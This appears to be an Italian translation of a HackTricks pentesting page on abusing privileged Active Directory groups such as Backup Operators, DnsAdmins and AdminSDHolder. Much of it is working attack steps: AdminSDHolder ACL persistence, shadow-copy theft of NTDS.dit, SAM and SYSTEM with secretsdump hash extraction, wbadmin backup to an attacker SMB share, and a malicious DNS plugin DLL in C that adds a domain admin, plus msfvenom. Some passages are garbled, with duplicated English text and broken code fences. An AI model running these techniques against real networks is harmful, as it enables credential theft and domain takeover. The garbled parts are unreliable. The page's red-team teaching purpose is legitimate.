# Gruppi privilegiati

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Gruppi noti con privilegi di amministrazione

* **Amministratori**
* **Domain Admins**
* **Enterprise Admins**

## Operatori di account

Questo gruppo ha il potere di creare account e gruppi che non sono amministratori nel dominio. Inoltre, consente l'accesso locale al Domain Controller (DC).

Per identificare i membri di questo gruppo, viene eseguito il seguente comando:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Aggiungere nuovi utenti è consentito, così come l'accesso locale a DC01.

## Gruppo AdminSDHolder

La lista di controllo degli accessi (ACL) del gruppo **AdminSDHolder** è fondamentale in quanto imposta le autorizzazioni per tutti i "gruppi protetti" all'interno di Active Directory, compresi i gruppi ad alta privilegi. Questo meccanismo garantisce la sicurezza di questi gruppi impedendo modifiche non autorizzate.

Un attaccante potrebbe sfruttare ciò modificando l'ACL del gruppo **AdminSDHolder**, concedendo pieni permessi a un utente standard. Questo darebbe effettivamente a tale utente il pieno controllo su tutti i gruppi protetti. Se i permessi di questo utente vengono modificati o rimossi, verranno automaticamente ripristinati entro un'ora a causa del design del sistema.

I comandi per visualizzare i membri e modificare le autorizzazioni includono:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
È disponibile uno script per accelerare il processo di ripristino: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Per ulteriori dettagli, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## Cestino di Active Directory

L'appartenenza a questo gruppo consente la lettura degli oggetti di Active Directory eliminati, che possono rivelare informazioni sensibili:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Accesso al Domain Controller

L'accesso ai file sul DC è limitato a meno che l'utente faccia parte del gruppo `Server Operators`, il che cambia il livello di accesso.

### Escalation dei privilegi

Utilizzando `PsService` o `sc` da Sysinternals, è possibile ispezionare e modificare le autorizzazioni dei servizi. Ad esempio, il gruppo `Server Operators` ha il controllo completo su determinati servizi, consentendo l'esecuzione di comandi arbitrari e l'escalation dei privilegi:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Questo comando rivela che gli `Operatori del server` hanno pieno accesso, consentendo la manipolazione dei servizi per ottenere privilegi elevati.

## Operatori di backup

L'appartenenza al gruppo `Operatori di backup` fornisce accesso al sistema di file di `DC01` grazie ai privilegi `SeBackup` e `SeRestore`. Questi privilegi consentono la navigazione delle cartelle, l'elenco e la copia dei file, anche senza autorizzazioni esplicite, utilizzando il flag `FILE_FLAG_BACKUP_SEMANTICS`. È necessario utilizzare script specifici per questo processo.

Per elencare i membri del gruppo, eseguire:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Attacco Locale

Per sfruttare questi privilegi a livello locale, vengono seguiti i seguenti passaggi:

1. Importare le librerie necessarie:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Abilita e verifica `SeBackupPrivilege`:

```plaintext
To enable `SeBackupPrivilege`, follow these steps:

1. Open the Local Security Policy editor by typing `secpol.msc` in the Run dialog (Win + R).
2. Navigate to `Local Policies` > `User Rights Assignment`.
3. Double-click on `Backup files and directories` in the right pane.
4. Click on `Add User or Group`.
5. Enter the name of the user or group you want to grant the privilege to and click `OK`.
6. Click `Apply` and then `OK` to save the changes.

To verify if `SeBackupPrivilege` is enabled for a user, you can use the following command:

```plaintext
whoami /priv
```

Look for `SeBackupPrivilege` in the output. If it is listed, then the privilege is enabled for the user.
```

```plaintext
Per abilitare `SeBackupPrivilege`, segui questi passaggi:

1. Apri l'editor delle impostazioni di sicurezza locale digitando `secpol.msc` nella finestra di esecuzione (Win + R).
2. Naviga su `Impostazioni locali` > `Assegnazione diritti utente`.
3. Fai doppio clic su `Eseguire il backup dei file e delle directory` nel riquadro destro.
4. Fai clic su `Aggiungi utente o gruppo`.
5. Inserisci il nome dell'utente o del gruppo a cui desideri concedere il privilegio e fai clic su `OK`.
6. Fai clic su `Applica` e poi su `OK` per salvare le modifiche.

Per verificare se `SeBackupPrivilege` è abilitato per un utente, puoi utilizzare il seguente comando:

```plaintext
whoami /priv
```

Cerca `SeBackupPrivilege` nell'output. Se è elencato, allora il privilegio è abilitato per l'utente.
```
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accedere e copiare file da directory restritte, ad esempio:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Attacco AD

L'accesso diretto al file system del Domain Controller consente il furto del database `NTDS.dit`, che contiene tutti gli hash NTLM degli utenti e dei computer di dominio.

#### Utilizzando diskshadow.exe

1. Creare una copia shadow del drive `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copia `NTDS.dit` dalla copia shadow:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
In alternativa, utilizzare `robocopy` per la copia dei file:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Estrarre `SYSTEM` e `SAM` per il recupero dell'hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recupera tutti gli hash da `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Utilizzo di wbadmin.exe

1. Configurare il filesystem NTFS per il server SMB sulla macchina dell'attaccante e memorizzare le credenziali SMB sulla macchina di destinazione.
2. Utilizzare `wbadmin.exe` per il backup di sistema e l'estrazione di `NTDS.dit`:
```cmd
net use X: \\<IndirizzoIPAttacco>\nomeshare /user:utentesmb password
echo "Y" | wbadmin start backup -backuptarget:\\<IndirizzoIPAttacco>\nomeshare -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<data-ora> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Per una dimostrazione pratica, guarda [VIDEO DIMOSTRATIVO CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi di sistema su un server DNS, spesso ospitato su Domain Controller. Questa capacità offre un notevole potenziale di sfruttamento.

Per elencare i membri del gruppo DnsAdmins, utilizzare:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Eseguire DLL arbitrarie

I membri possono far caricare al server DNS una DLL arbitraria (sia localmente che da una condivisione remota) utilizzando comandi come:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
È necessario riavviare il servizio DNS (che potrebbe richiedere autorizzazioni aggiuntive) affinché la DLL venga caricata:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Per ulteriori dettagli su questo vettore di attacco, consulta ired.team.

#### Mimilib.dll
È anche possibile utilizzare mimilib.dll per l'esecuzione di comandi, modificandolo per eseguire comandi specifici o reverse shell. [Controlla questo post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) per ulteriori informazioni.

### Record WPAD per MitM
DnsAdmins può manipolare i record DNS per eseguire attacchi Man-in-the-Middle (MitM) creando un record WPAD dopo aver disabilitato la lista di blocco delle query globali. Strumenti come Responder o Inveigh possono essere utilizzati per il falsificare e catturare il traffico di rete.

### Lettori di log degli eventi
I membri possono accedere ai log degli eventi, potenzialmente trovando informazioni sensibili come password in chiaro o dettagli sull'esecuzione dei comandi:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Permessi di Exchange Windows
Questo gruppo può modificare i DACLs sull'oggetto di dominio, potenzialmente concedendo privilegi DCSync. Le tecniche per l'elevazione dei privilegi che sfruttano questo gruppo sono dettagliate nel repository GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Amministratori di Hyper-V
Gli amministratori di Hyper-V hanno pieno accesso a Hyper-V, che può essere sfruttato per ottenere il controllo sui controller di dominio virtualizzati. Ciò include la clonazione dei DC attivi e l'estrazione degli hash NTLM dal file NTDS.dit.

### Esempio di sfruttamento
Il servizio di manutenzione di Mozilla di Firefox può essere sfruttato dagli amministratori di Hyper-V per eseguire comandi come SYSTEM. Ciò comporta la creazione di un collegamento rigido a un file SYSTEM protetto e la sua sostituzione con un eseguibile dannoso:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Nota: Lo sfruttamento dei collegamenti rigidi è stato mitigato nelle recenti aggiornamenti di Windows.

## Gestione dell'organizzazione

Negli ambienti in cui è implementato **Microsoft Exchange**, esiste un gruppo speciale chiamato **Gestione dell'organizzazione** che possiede capacità significative. Questo gruppo ha il privilegio di **accedere alle caselle di posta di tutti gli utenti del dominio** e mantiene **il controllo completo sull'Unità Organizzativa (OU) 'Gruppi di sicurezza di Microsoft Exchange'**. Questo controllo include il gruppo **`Exchange Windows Permissions`**, che può essere sfruttato per l'elevazione dei privilegi.

### Sfruttamento dei privilegi e comandi

#### Operatori di stampa
I membri del gruppo **Operatori di stampa** sono dotati di diversi privilegi, tra cui il **`SeLoadDriverPrivilege`**, che consente loro di **effettuare l'accesso locale a un Domain Controller**, spegnerlo e gestire le stampanti. Per sfruttare questi privilegi, specialmente se **`SeLoadDriverPrivilege`** non è visibile in un contesto non elevato, è necessario bypassare il Controllo dell'Account Utente (UAC).

Per elencare i membri di questo gruppo, viene utilizzato il seguente comando PowerShell:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Per tecniche di exploit più dettagliate relative a **`SeLoadDriverPrivilege`**, si consiglia di consultare risorse specifiche sulla sicurezza.

#### Utenti Desktop Remoto
I membri di questo gruppo hanno accesso ai PC tramite il protocollo Desktop Remoto (RDP). Per enumerare questi membri, sono disponibili comandi PowerShell:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Ulteriori approfondimenti sull'exploit di RDP possono essere trovati nelle risorse dedicate al pentesting.

#### Utenti di gestione remota
I membri possono accedere ai PC tramite **Windows Remote Management (WinRM)**. L'enumerazione di questi membri viene ottenuta attraverso:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Per le tecniche di exploit legate a **WinRM**, consultare la documentazione specifica.

#### Operatori del server
Questo gruppo ha le autorizzazioni per eseguire varie configurazioni sui controller di dominio, inclusi i privilegi di backup e ripristino, la modifica dell'ora di sistema e l'arresto del sistema. Per enumerare i membri, viene fornito il seguente comando:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Riferimenti <a href="#riferimenti" id="riferimenti"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
